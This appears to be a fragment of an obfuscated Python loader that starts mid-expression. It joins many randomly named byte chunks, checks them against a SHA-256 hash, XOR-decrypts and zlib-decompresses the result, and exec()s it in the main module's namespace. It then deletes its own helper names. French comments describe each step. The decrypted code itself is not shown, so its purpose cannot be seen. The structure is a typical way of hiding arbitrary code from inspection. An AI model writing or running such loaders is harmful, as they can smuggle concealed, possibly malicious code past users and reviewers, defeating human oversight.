_crpF7rD7LJa6HR + _cowncvMlQ1Mr0b + _cjBCX7TB04_tv7 + _cvlI6RH2gd3ORo + _ccV0t4nutS9Gzj + _cdYBH_3xgoqHtD + _cjE1TYDmOM_ISc + _caRBF3Yf43lgod + _cgaSU9Dim69Xd1 + _czVlsfrGZDxRv6 + _cg_VQp31qg7tQZ + _cyti4hOh6YpyIS + _cfM5iY2KQ36MfT + _cj73_fDag1Z8j1 + _cbh1ubieLw_1pB + _cbKiyQ8BKol8rO + _ckogjzDhw_NsPL + _cjfWgj8xr5kC61 + _cp0GlPY3Gy6VZa + _ck8w6xd6LN1DAe + _cpKWuGsjYoXMjg + _cy0EKOqiFK0TTb + _czgF5tNO9nVN7q + _cg2twivvezPL4t + _cvuo2of9PscSJn + _cg0sjHd0BG4uyk + _cnEbqa1jZWalj2 + _cumvdaLIKny4xo + _czR3UaU9x1qtZu + _czF7pMdXq7P_6O + _ct9frQdwQrEYvt + _csZ0KSNsMdO0fV + _crf2GAR5aZ4LUL + _ch30_rKHAJCTPv + _cm4boFLEa4U8cx + _c_LUdYtiPlQro4 + _cajZd4Dp6NjN1O + _chfUoawPpAzdOs + _cwK0nQ5dh9vL8u + _cfreAs7RM6kiP_ + _cbtyHoljruGmkY + _cvGkFHwevboqCm + _cyRXntga8jLMKH + _cmX4Ce200CH_fa + _c_ipYjC3HBCElH + _cn5jIySQsZLlZA + _cgkPXCJ3hwYk6L + _cquNSqslm_07ym + _chtqURUBtIDLWP + _cmvmsitGIRIvSn + _clO_ozk5K35u7D + _cstifp7cLX2uyD + _ccv3hAr5N3oLcs + _ccAZOUKbxsWXOF + _c_xCbTwVuIYBZy + _cuuqGrJtB35f_t + _cfsXY6SysLLzuk + _cmT9wDRihvA0Iv + _ciTE0neLMr_6pF + _cchLgP0_xBH0DQ + _cxOcETt4ipekWf + _coUS4l1rnFvTOU + _cs08AmFVEuM7JX + _cgmz5mhoBhB8yz + _cacUXMhdkMkryY + _crpX8DA4wazX18 + _cbwwvdwWoKQcJS + _ciYdsHJvXo84_1 + _cwWUVfylp9TbZP + _cdD4WKnr1kKzir + _cdAkducgyLlPTL + _cwxiXQK07VHWZ7 + _cxMoGzVB45HAZI + _cb3eQIdojtd7r9 + _cscEJuUdKHD7r_ + _cuYZLhEeXEUReS + _ceShX_96M6LvBf + _cxXd4MWaeAe7T7 + _cfUWJpKQLtsG24 + _cdmQt02LcOh3HN + _c_RKZUioKdQIW3 + _ciMRZyUcLWnxau + _cmaLERrSneAaH7 + _c_yUjTy5YBdJq4 + _ctp8UH25wT26hG + _cp8gz6rtJAthgq + _cw3gKv8FwhgB9T + _cudTcV9nPGJbAl + _cbbjL3Q8j4Y8E6 + _cdIESQZ2xTJoXa + _cpv88yhnFm2rqr + _cnVA6YmVtjuDEx + _cmus0bj9SJZsiI + _chyc0bR4iBDM1N + _crWd_hSWTRbGb3 + _ch2r4BK8uof3Wc + _cwuvtgNKH95u0e + _cejhZDHHW2HyBT + _cuyojQkmeoe_2x + _cvNUvtmkSp8jAA + _cuJkTz6_IJ4mRa + _coWJB1ghdDVtXJ + _cis_x97QlqCTL0 + _cv_HRyALFtqRb6 + _cpRITjbOsJhfI8 + _cfh1d1FlnYzDEm + _cu0lRujSGm0R22 + _c_sS3mJYZ4XFEf + _cjdkBQ7ooLngTu + _caNtPHH5iNSGJV + _cfCD6lqNt3wnvt + _cd3Rtyw9MEgs34 + _cjWFn9ygqMEaPM + _ccMLUV7tqKLecd + _cizavfzsPyYFny + _cdai1MM22tWtN5 + _cbtV79GthcIgCH + _cwnPDEhbTMwUx7 + _clvo6c5YoUHh_k + _ciEYKgZmQ2Qefr + _cl9ARcO468hP0P + _cutUvnRzLbe1tJ + _cvlL2Q7ZfAmCE4 + _cemDDbX07a6SzN + _clMqkoS4lgKOmh + _clfndMOZ9CUrBh + _caMemsOU1SHIEC + _ckP10d5MQ5Die5 + _cmOKud1Plx7cmN + _ccUqog5JEImEtH + _cdJZj_GculEpD2 + _cyY5PYMzAcaMZs + _ctXsEv0buybeCu + _cdAI3JK3waK77N + _cuSkoNPYjoREay + _ciYW4XdPpDnCmD + _cmPNqtEsAOIrTJ + _cwsrGzIftwNQ4T + _cnBEVxOTguPraX + _csvRDqMA3m9zDl + _ccJHRvATEVAXET + _cvcFkZ9SX0lDuH + _cnsbu8wVIivOOC + _cfOybacZ0jIz30 + _co3GE3WK1N3RoI + _crpRdlB2xoW8kw + _cuilQrXzHooxUm + _cw1CA4hHioWsMj + _crossALfIABM8q + _cqEEHmBvTqf6XV + _cr4b2AgjB_2g0m + _cgYxa9Ew3fY_4Z + _clyJia6mg0JSjO + _cdSA2xYm1c8ZcV + _cyw_sgJO41INtJ + _chuXLNQb1uBVIL + _coNTr_TvMDIpnr + _csYRADPcmCa8ez + _cdxYjJmx_oiskD + _chimzwkmYOI5eh + _citlaPv5oZxcBB + _czgbJvhrDbFpI2 + _cdRYZ7gNy_ptre + _cdYJkgTXKYYpz2 + _ceSo0AD6grQXah + _casigGms79fBD1 + _caO0M2oB3diE0e + _cmLyeBYoIQ6kqT + _cog0PyuCZhX3t4 + _csc7CAp7WRSPD4 + _cwCW6Zdsg7OUIU + _cwMpD4MNjc1Tum + _cueLKyIlnN8akR + _cc2J5XWobQy1e4 + _ceDotXDwA7QdHP + _cxgxIVWN2vjNZH + _ca7_wgh6EBOfHP + _cgp4cwtvYWerMb + _chR9UGbvlKjnSO)
if __import__('hashlib').sha256(_pqRCfrJkWiHBC9).hexdigest() != '89379318d38f4effcdc205e6e723805084dd47fa011cf069860446b98ea333d7':
    __import__('sys').exit(1)
_xlwd87K3r5D86I = bytes([228, 2, 208, 5, 198, 145, 43, 120, 110, 151, 142, 139, 3, 149, 204, 170, 215, 241, 88, 71])
_fkpRt85TJ9Wr5oO = bytes([94, 157, 186, 33, 229, 7, 93, 22, 103, 47, 247, 238, 28, 235, 78, 22, 145, 221, 177, 187])

def _fxa1mUX9ZMtxlWT(_bviNwnMP4AYahh, _krcpaSDLDuQtxT):
    return bytes(_bviNwnMP4AYahh[_iewbix05zyMHQ6] ^ _krcpaSDLDuQtxT[_iewbix05zyMHQ6 % len(_krcpaSDLDuQtxT)] for _iewbix05zyMHQ6 in range(len(_bviNwnMP4AYahh)))

def _fdgVg3OKuNxppJZ(_tilxBfkcTxsxku):
    import zlib
    return zlib.decompress(_tilxBfkcTxsxku) # Un seul niveau de zlib ici pour simplifier

def _femoxcViRsNTxGi():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfKbzoklT2DIfp = _fxa1mUX9ZMtxlWT(_pqRCfrJkWiHBC9, _xlwd87K3r5D86I)
    # 2. Décompression Zlib
    _dyK6nhekGFmdoC = _fdgVg3OKuNxppJZ(_xfKbzoklT2DIfp)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dyK6nhekGFmdoC.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nm8oyr7ce1OAMr = _main.__dict__
    _nm8oyr7ce1OAMr.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nm8oyr7ce1OAMr)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_femoxcViRsNTxGi()
try:
    del _fxa1mUX9ZMtxlWT, _fdgVg3OKuNxppJZ, _femoxcViRsNTxGi
    del _pqRCfrJkWiHBC9, _xlwd87K3r5D86I, _fkpRt85TJ9Wr5oO
except:
    pass
